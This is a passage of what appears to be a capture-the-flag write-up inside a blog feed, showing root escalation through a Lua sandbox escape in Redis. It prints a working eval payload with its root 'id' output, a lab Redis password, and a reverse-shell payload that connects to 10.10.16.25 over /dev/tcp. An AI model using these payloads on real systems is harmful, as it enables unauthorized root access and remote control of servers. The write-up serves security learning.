+</ul>
+<h3 id="getting-reverse-shell-as-root">Getting Reverse Shell As root</h3>
+<p>Now that the port is forwarded, I&rsquo;ll can interact with the server and send the malicious payload, but first I need to install <em>redis-cli</em> which comes with <em>redis-tools</em> package:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo apt install redis-tools
+</span></span></code></pre></div><p>The payload that I&rsquo;ll send to execute <code>id</code> command is the following: <code>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ redis-cli -h 127.0.0.1 -a F2WHqJUz2WEz<span style="color:#f92672">=</span>Gqq
+</span></span><span style="display:flex;"><span>Warning: Using a password with <span style="color:#e6db74">&#39;-a&#39;</span> or <span style="color:#e6db74">&#39;-u&#39;</span> option on the command line interface may not be safe.
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; eval <span style="color:#e6db74">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;id&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39;</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;uid=0(root) gid=0(root) groups=0(root)\n&#34;</span>
+</span></span></code></pre></div><p>And I can see that I got code execution as root!!</p>
+<p>The payload to get a reverse shell is like the following: <code>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;bash -c \&quot;bash -i&gt;&amp; /dev/tcp/10.10.16.25/9002 0&gt;&amp;1\&quot;&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</code></p>
+<p><img src="Getting-root_reverse_shell.png" alt="Getting root Shell"></p>
+]]></content>
+        </item>
         
         <item>
             <title>Moderators</title>
